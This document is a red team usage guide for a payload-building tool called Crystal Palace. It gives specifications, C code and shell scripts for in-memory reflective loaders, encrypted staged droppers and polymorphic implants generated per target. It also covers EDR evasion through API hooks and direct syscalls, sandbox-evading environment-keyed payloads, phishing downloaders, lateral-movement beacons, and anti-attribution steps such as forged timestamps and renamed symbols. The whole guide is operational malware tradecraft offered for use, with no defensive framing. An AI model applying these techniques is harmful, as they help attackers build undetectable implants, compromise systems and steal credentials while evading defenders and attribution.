# Crystal Palace - Red Team Usage Guide

## Operational Use Cases

### 1. Custom Reflective Loaders

**Scenario**: Need to load DLLs in memory without touching disk

**Crystal Palace Advantage**:
- Build position-independent DLL loaders
- Embed target DLL as resource
- Apply mutation for unique signatures per operation

**Implementation**:
```
# Specification
load "reflective_loader.x64.o"
  dfr "resolve" "ror13"
  fixbss "_bss_fix"
  make pic +optimize +mutate +disco
load "target.dll"
  append $PIC
link "reflective_package.bin"
```

**Operational Benefits**:
- No disk writes (in-memory only)
- Unique signature per build
- Evades static signatures on loader pattern

### 2. Staged Payload Delivery

**Scenario**: Initial access is constrained (size limits, encoding restrictions)

**Crystal Palace Advantage**:
- Build minimal stage 1 loader
- Encrypt larger stage 2 capabilities
- Link decryption key via symbols

**Implementation**:
```
# Stage 1: Tiny encrypted dropper
load "decrypt_execute.x64.o"
  make pic +optimize  # Minimal size
load "encrypted_beacon.bin"
  append $PIC
load "key.bin"
  append $PIC
link "stage1.bin"
```

**Operational Benefits**:
- Stage 1 < 5KB (fits in many constraints)
- Stage 2 encrypted at rest
- Modular staging strategy

### 3. Polymorphic Implants

**Scenario**: Need unique binary for each target to prevent cross-attribution

**Crystal Palace Advantage**:
- +mutate creates unique instances
- Same functionality, different signatures
- Automated generation at scale

**Automation Script**:
```bash
#!/bin/bash
# Generate 100 unique implants for operation

for target in targets/*.txt; do
    TARGET_NAME=$(basename "$target" .txt)
    ./link implant.spec.txt
    mv output.bin "implants/${TARGET_NAME}_implant.bin"
    # Each build is unique due to +mutate
done
```

**Operational Benefits**:
- No two targets have same binary
- Defeats signature-based correlation
- Automated at scale

### 4. COFF Execute Capabilities

**Scenario**: Post-exploitation tasks that need to be small, flexible

**Crystal Palace Advantage**:
- Build COFF payloads smaller than DLLs
- Merge multiple utilities into one COFF
- Use PICO convention for execution

**Implementation**:
```
# Combine multiple capabilities
load "screenshot.x64.o"
  merge
load "keylog.x64.o"
  merge
load "clipboard.x64.o"
  merge
  make coff +optimize
link "multi_capability.o"
```

**Operational Benefits**:
- Smaller payload size (no PE overhead)
- Multiple capabilities in one file
- Easier to obfuscate than full PE

### 5. API Hooking for EDR Evasion

**Scenario**: Need to bypass EDR hooks or monitoring

**Crystal Palace Advantage**:
- Instrument capabilities with custom hooks
- Redirect monitored APIs to custom implementations
- Separate evasion logic from capability logic

**Implementation**:
```
# Hook commonly monitored APIs
attach "KERNEL32$CreateFileA" "_StealthCreateFile"
attach "KERNEL32$CreateProcessA" "_StealthCreateProcess"
attach "ADVAPI32$RegSetValueExA" "_StealthRegSet"
```

```c
HANDLE WINAPI _StealthCreateFile(...) {
    // Evade monitoring:
    // - Use NtCreateFile directly
    // - Check if path is monitored
    // - Apply obfuscation
    return evade_and_create_file(...);
}
```

**Operational Benefits**:
- Bypass userland hooks
- Custom evasion per API
- Reusable hook library

## Operational Patterns

### Pattern 1: Encrypted Payload Containers

**Use when**: Delivering payloads through inspected channels

**Structure**:
```
[Small PIC Decrypter] → [Encrypted Capability] → [Encryption Key/Config]
```

**Specification**:
```
load "decrypter.x64.o"
  make pic +mutate
load "encrypted_payload.bin"
  append $PIC
load "config.bin"
  append $PIC
```

**Access Pattern**:
```c
extern unsigned char _binary_encrypted_payload_bin_start[];
extern unsigned int  _binary_encrypted_payload_bin_size;
extern unsigned char _binary_config_bin_start[];

void go(void) {
    // Parse config for decryption key
    parse_config(_binary_config_bin_start);

    // Decrypt payload in-place
    decrypt(_binary_encrypted_payload_bin_start,
            _binary_encrypted_payload_bin_size,
            config.key);

    // Execute decrypted payload
    void (*payload)() = (void(*)())_binary_encrypted_payload_bin_start;
    payload();
}
```

**Operational Security**:
- Payload encrypted at rest
- Key not embedded in code (in separate resource)
- Small decrypter can be heavily mutated

### Pattern 2: Modular Post-Exploitation

**Use when**: Need flexible post-ex capabilities without monolithic implant

**Structure**:
```
[Core Loader] → [PICO Module 1] → [PICO Module 2] → [PICO Module 3]
```

**Specification**:
```
load "pico_loader.x64.o"
  make pic +optimize +mutate
load "screenshot.pico"
  append $PIC
load "credential_dump.pico"
  append $PIC
load "lateral_movement.pico"
  append $PIC
```

**Execution**:
```c
// Selectively execute PICOs based on C2 tasking
if (task == TASK_SCREENSHOT)
    execute_pico(_binary_screenshot_pico_start);
else if (task == TASK_CREDENTIALS)
    execute_pico(_binary_credential_dump_pico_start);
```

**Operational Benefits**:
- Modular capabilities
- Only execute what's needed
- Easier to update individual modules

### Pattern 3: Environment-Keyed Payloads

**Use when**: Ensure payload only runs on intended target

**Structure**:
```
[Environment Checker] → [Encrypted Payload] → [Target Fingerprint]
```

**Specification**:
```
load "env_keyed_loader.x64.o"
  make pic +mutate
load "encrypted_beacon.bin"
  append $PIC
load "target_fingerprint.bin"
  append $PIC
```

**Logic**:
```c
extern unsigned char _binary_target_fingerprint_bin_start[];

void go(void) {
    // Derive key from environment
    unsigned char key[32];
    derive_key_from_environment(key);
    // Examples: hostname hash, MAC address, domain, etc.

    // Verify we're on correct target
    if (!verify_fingerprint(_binary_target_fingerprint_bin_start, key))
        return;  // Wrong environment, fail silently

    // Decrypt and execute
    decrypt_and_execute(_binary_encrypted_beacon_bin_start, key);
}
```

**Operational Security**:
- Payload won't run on analyst sandbox
- Requires specific environment characteristics
- No obvious error messages

## EDR Evasion Strategies

### Strategy 1: Syscall Instrumentation

**Goal**: Bypass userland API hooks

**Crystal Palace Implementation**:
```
attach "KERNEL32$VirtualAlloc" "_DirectSyscall_VirtualAlloc"
attach "KERNEL32$WriteProcessMemory" "_DirectSyscall_WPM"
```

```c
LPVOID WINAPI _DirectSyscall_VirtualAlloc(...) {
    // Skip kernel32.dll, call NtAllocateVirtualMemory directly
    return syscall_NtAllocateVirtualMemory(...);
}
```

**Benefits**:
- All VirtualAlloc calls automatically redirected
- No code changes to capability
- Reusable hook library

### Strategy 2: Memory Allocation Patterns

**Goal**: Evade heuristics on RWX memory

**Implementation**:
```
attach "KERNEL32$VirtualAlloc" "_StealthAlloc"
```

```c
LPVOID WINAPI _StealthAlloc(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
) {
    // If requesting RWX, split into RW + execute later
    if (flProtect == PAGE_EXECUTE_READWRITE) {
        LPVOID mem = KERNEL32$VirtualAlloc(
            lpAddress, dwSize, flAllocationType, PAGE_READWRITE
        );
        // Caller will change to RX when ready
        return mem;
    }

    return KERNEL32$VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
}
```

### Strategy 3: Network Traffic Instrumentation

**Goal**: Encrypt/obfuscate C2 traffic at API layer

**Implementation**:
```
attach "WS2_32$send" "_EncryptSend"
attach "WS2_32$recv" "_DecryptRecv"
```

```c
int WINAPI _EncryptSend(SOCKET s, const char* buf, int len, int flags) {
    // Encrypt buffer before sending
    char* encrypted = malloc(len + 16);
    int encrypted_len = encrypt(buf, len, encrypted);

    int result = WS2_32$send(s, encrypted, encrypted_len, flags);

    free(encrypted);
    return result;
}
```

**Benefits**:
- Application-layer encryption
- No changes to C2 logic
- Pluggable encryption schemes

## OPSEC Considerations

### Build Hygiene

**Problem**: Build artifacts can leak information

**Best Practices**:
1. Use +mutate on every operational build
2. Don't reuse exact specifications across operations
3. Vary +disco ordering per target
4. Strip debug symbols
5. Use different compiler flags per campaign

**Automation**:
```bash
# Randomize compiler optimizations
OPTS=("-O2" "-O3" "-Os")
RAND_OPT=${OPTS[$RANDOM % ${#OPTS[@]}]}

gcc $RAND_OPT -c capability.c -o capability.o

./link capability.spec.txt
```

### Symbol Information

**Problem**: Symbol names can reveal capability function

**Mitigation**:
```bash
# Strip symbols after linking
strip --strip-all output.bin

# Or use strip-all during compilation
gcc -s -c capability.c
```

**Crystal Palace Option**: Use remap to obfuscate before linking:
```
remap "exfiltrate_data" "z1x2c3"
remap "keylogger_main" "a9b8c7"
```

### Resource Linking

**Problem**: Appended resources may have known signatures

**Mitigation**:
1. Encrypt resources before appending
2. Compress resources (changes signature)
3. Use +mutate on resources if applicable
4. Randomize padding between resources

```
load "loader.x64.o"
  make pic +mutate
load "payload_encrypted.bin"  # Pre-encrypt
  append $PIC
load "random_padding.bin"     # Random data
  append $PIC
load "config_compressed.bin"  # Compressed
  append $PIC
```

### Timing Considerations

**Problem**: Build timestamps can correlate operations

**Mitigation**:
```bash
# Randomize file timestamps
touch -d "2023-06-15 14:32:18" output.bin

# Or use a date from common software
touch -r /usr/bin/ls output.bin
```

## Deployment Scenarios

### Scenario 1: Phishing Payload

**Constraints**:
- Must evade email gateway
- Small size preferred
- Needs to download stage 2

**Solution**:
```
# Minimal downloader
load "http_download.x64.o"
  make pic +optimize +mutate
load "c2_config.bin"
  append $PIC
link "downloader.bin"
```

**OPSEC**:
- < 10KB size
- Unique per target (+mutate)
- Config appended (no hardcoded URLs)

### Scenario 2: Local Privilege Escalation

**Constraints**:
- Runs in constrained environment
- May have limited API access
- Needs to be reliable

**Solution**:
```
# Stable, optimized exploit
load "exploit.x64.o"
  dfr "resolve" "ror13" "KERNEL32, NTDLL"
  dfr "resolve_ext" "strings"  # Fallback
  make pic +optimize
  # Note: No +disco or +mutate for stability
```

**OPSEC**:
- Reliable resolution with fallback
- Optimized for size
- Stable (no mutation that could break exploit)

### Scenario 3: Lateral Movement

**Constraints**:
- Must run remotely (PSExec, WMI, etc.)
- Needs to beacon back
- Should clean up

**Solution**:
```
# Self-contained lateral movement implant
load "lateral_implant.x64.o"
  make pic +optimize +mutate +disco
load "cleanup_script.bin"
  append $PIC
load "c2_config.bin"
  append $PIC
```

**Execution**:
```c
void go(void) {
    // Establish C2
    beacon_home(_binary_c2_config_bin_start);

    // Execute tasking
    execute_tasks();

    // Clean up
    run_cleanup(_binary_cleanup_script_bin_start);
}
```

## Attribution Avoidance

### Technique 1: Polymorphic Generation

```bash
# Generate unique implant per target
for target in "${TARGETS[@]}"; do
    # Modify source slightly (comments, variable names, etc.)
    sed -i "s/\/\/ MARKER/\/\/ Target: $target/" implant.c

    # Recompile
    gcc -c implant.c -o "implant_${target}.o"

    # Link with mutation
    ./link implant.spec.txt
    mv output.bin "implants/${target}.bin"
done
```

**Result**: No two implants have same hash, breaking hash-based attribution.

### Technique 2: Capability Separation

**Avoid**: Monolithic implants with all capabilities

**Instead**: Modular approach with Crystal Palace

```
# Core implant
load "core.x64.o"
  make pic +optimize +mutate

# Separate PICOs for each capability
load "screenshot.pico"
  append $PIC
load "keylog.pico"
  append $PIC
```

**Benefit**: Captured implant doesn't reveal full capability set.

### Technique 3: Infrastructure Separation

**Pattern**: Use different Crystal Palace specifications per infrastructure set

```
# Infrastructure A spec
load "implant.x64.o"
  make pic +optimize +mutate +disco
load "infra_a_config.bin"
  append $PIC

# Infrastructure B spec
load "implant.x64.o"
  make pic +optimize +mutate  # No disco
load "infra_b_config.bin"
  append $PIC
```

**Benefit**: Different transformations prevent linking implants to same operator.

## Troubleshooting Operational Issues

### Issue: Payload Crashes on Target

**Likely Causes**:
1. fixptrs failure on exotic instructions
2. fixbss can't find suitable memory
3. DFR resolver incompatible with target environment

**Debug Approach**:
```
# Build debug version without transformations
load "implant.x64.o"
  dfr "resolve" "strings"  # Use stable string-based DFR
  # No fixptrs, no fixbss, no mutations
  make pic

# Test on target
# Add logging to identify crash point
```

### Issue: Detected by AV/EDR

**Likely Causes**:
1. Known signature in code or resources
2. Behavioral heuristics triggered
3. API hooking detected

**Mitigation**:
```
# Increase mutation
make pic +optimize +mutate +disco

# Add API hooking for evasion
attach "KERNEL32$CreateFileA" "_StealthCreateFile"
attach "KERNEL32$VirtualAlloc" "_StealthVirtualAlloc"

# Encrypt resources
# (Encrypt payload.bin before appending)
```

### Issue: Implant Won't Execute

**Likely Causes**:
1. Missing DFR resolver for required API
2. Entry point not correctly positioned
3. Incompatible calling convention

**Debug**:
```
# Ensure go() is first
make pic +gofirst

# Use dual-resolver pattern
dfr "resolve" "ror13" "KERNEL32, NTDLL"
dfr "resolve_ext" "strings"  # Catch-all

# Verify calling convention
# Ensure go() is: void go(void)
```

## Operational Workflows

### Workflow 1: Initial Access to C2

```
Day 1: Reconnaissance
→ Identify target environment (x86/x64, OS version)

Day 2: Payload Development
→ Write minimal C2 implant
→ Create Crystal Palace spec with +mutate

Day 3: Testing
→ Test in lab environment matching target
→ Verify all functionality works

Day 4: Deployment
→ Generate unique instance with +mutate +disco
→ Deliver via chosen method
→ Establish C2 connection

Day 5: Post-Exploitation
→ Deploy modular PICOs as needed
→ Each PICO uniquely mutated
```

### Workflow 2: Lateral Movement

```
Initial Host Compromised
→ Gather credentials

For Each Target Host:
  → Generate unique lateral movement payload
  → Embed target-specific config
  → Deploy via WMI/PSExec/etc.
  → Verify callback
  → Clean up deployment artifacts
```

### Workflow 3: Persistence

```
Establish Initial Access
→ Create persistent PICO runner

Build Modular Capabilities:
  → Core C2 functionality (PICO)
  → Credential harvesting (PICO)
  → Lateral movement (PICO)
  → Exfiltration (PICO)

Deploy Runner:
  → Runner loads PICOs from disk/registry/network
  → Each PICO uniquely mutated
  → Runner itself polymorphic (+mutate)

Maintain Access:
  → Update PICOs without touching runner
  → Runner signature stable (or re-mutate periodically)
```

## Conclusion

Crystal Palace transforms red team payload development from manual, error-prone processes into automated, scalable operations. Key operational advantages:

1. **Rapid Iteration**: Modify and rebuild in seconds
2. **Polymorphic at Scale**: Unique payloads per target automatically
3. **Modular Tradecraft**: Reusable hooks and transformations
4. **OPSEC by Default**: Mutations and optimizations built-in
5. **Productivity Multiplier**: One operator has productivity of a team

By mastering Crystal Palace, red teams gain a significant operational advantage in capability development, deployment flexibility, and evasion sophistication.
